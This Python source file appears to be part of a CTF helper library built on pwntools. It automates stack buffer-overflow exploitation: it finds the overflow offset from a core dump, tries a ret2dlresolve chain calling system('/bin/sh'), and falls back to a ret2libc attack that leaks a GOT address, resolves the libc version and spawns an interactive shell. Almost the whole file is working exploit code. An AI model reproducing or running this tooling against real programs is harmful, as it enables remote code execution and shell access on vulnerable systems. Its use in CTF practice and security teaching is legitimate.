from typing import Optional

from pwn import *

from ctflib.pwn.libc import download_libc, fetch_libc_ver
from ctflib.pwn.util import SetupFunction
from ctflib.pwn.elf import ELFSec


def find_bof_offset(e):
    loglevel = context.log_level
    context.log_level = "error"
    context.binary = e
    os.system("rm core")
    payload = cyclic(1000, n=context.bits // 8)
    p = e.process()
    p.sendline(payload)
    p.wait()
    core = Coredump("./core")
    rbp = core.rbp if context.bits == 64 else core.ebp
    assert pack(rbp) in payload
    context.log_level = loglevel
    return cyclic_find(pack(rbp), n=context.bits // 8) + context.bits // 8


def try_dlresolve(setup: SetupFunction, offset: int):
    elf = context.binary
    assert elf is not None, "context.binary not set"
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    functions = {
        "gets": [dlresolve.data_addr],
        "read": [0, dlresolve.data_addr],
    }
    for func, args in functions.items():
        rop = ROP([elf])
        try:
            rop.call(func, args)
        except:
            log.warn(f"'{func}' does not exist")
            continue
        log.info(f"Testing dlresolve with {func}")
        rop.ret2dlresolve(dlresolve)
        r = setup()
        r.sendline(b"a" * offset + rop.chain())
        pause(1)
        try:
            r.sendline(dlresolve.payload)
            r.interactive()
            r.close()
            return True
        except:
            log.warn(f"'{func}' failed with code {r.poll()}")


def try_ret2libc(setup: SetupFunction, offset: int, ret_addr: Optional[int] = None):
    elf = context.binary
    assert elf is not None, "context.binary not set"
    if ret_addr is None:
        ret_addr = elf.sym.main
    functs = ["puts", "printf"]
    for func in functs:
        if func in elf.got:
            log.info(f"Testing ret2libc with {func}")
            rop = ROP([elf])
            rop.call(elf.plt[func], [elf.got[func]])
            rop.call(ret_addr)
            r = setup()
            r.sendline(b"a" * offset + rop.chain())
            while True:
                line = r.recvline(keepends=False)
                if all(x <= 122 for x in line):
                    continue
                bits = 6 if context.bits == 64 else 4
                leak = line[-bits:]
                if bits == 6:
                    leak += b"\0\0"
                if len(leak) != context.bits // 8:
                    continue
                leak = unpack(leak)
                possible_libcs = fetch_libc_ver(leak, func)
                if possible_libcs and input(
                        "Does this look like a libc leak to you [Y/n]?\n" + str(line) + "\n").strip() != "n":
                    break
            amd64_libcs = [x for x in possible_libcs if "amd" in x and "i386" not in x and "x32" not in x]
            print("Found LIBCs:")
            for i, x in enumerate(possible_libcs):
                print(f"({i}) {x} {'*' if x in amd64_libcs else ''}")
            libc_version = possible_libcs[int(input("Select LIBC version:"))]

            libc = ELF(download_libc(libc_version), checksec=False)
            libc_addr = leak - libc.sym[func]
            if hex(libc_addr)[-3:] != "000":
                log.warn("LIBC is not 12 bit aligned")
                return
            libc.address = libc_addr
            sys = libc.symbols.system
            sh = next(libc.search(b"/bin/sh"))
            rop2 = ROP([elf])
            rop2.call(rop2.find_gadget(["ret"]))
            rop2.call(sys, [sh, ])
            r.sendline(b"a" * offset + rop2.chain())
            r.interactive()
            r.close()
            return True
        else:
            log.warn(f"'{func}' does not exist")


def ret_anywhere(setup: SetupFunction, offset: int):
    elf = context.binary
    assert elf is not None, "context.binary not set"
    log.info("Testing ret2libc and ret2dlresolve")
    sec = ELFSec.get_sec(elf)
    if sec.pie:
        log.warn("ABORT: PIE binary detected")
        return
    if sec.canary:
        log.warn("ABORT: Canary found")
        return
    if sec.got_writable:
        if try_dlresolve(setup, offset):
            return
    else:
        log.warn("GOT is not writable, skipping ret2dlresolve")
    try_ret2libc(setup, offset)
